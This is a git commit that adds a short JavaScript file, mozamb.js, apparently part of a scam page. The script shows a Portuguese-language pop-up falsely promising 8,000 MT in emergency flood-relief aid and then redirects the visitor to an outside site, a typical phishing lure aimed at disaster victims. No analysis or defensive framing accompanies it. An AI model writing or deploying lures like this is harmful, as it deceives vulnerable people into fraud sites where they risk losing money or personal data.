f85e3ee77a7fb8340a90adffb30f4d0bf05ab1c2
newetijazz16 <newetijazz16@gmail.com>
2026-01-22 06:55:01 +0100

    Create mozamb.js

---
+++ mozamb.js
@@ -0,0 +1,5 @@
+var password = 'Enviar agora'
+password=prompt('Parabéns! Você tem direito a receber o auxílio emergencial de MT 8.000 para vítimas das enchentes. Clique em OK para receber o seu agora mesmo.','Enviar agora');
+if (password != 'Enviar agora') {
+location.href='https://www.knerxbz.site/APOIO-Emergencia';
+}
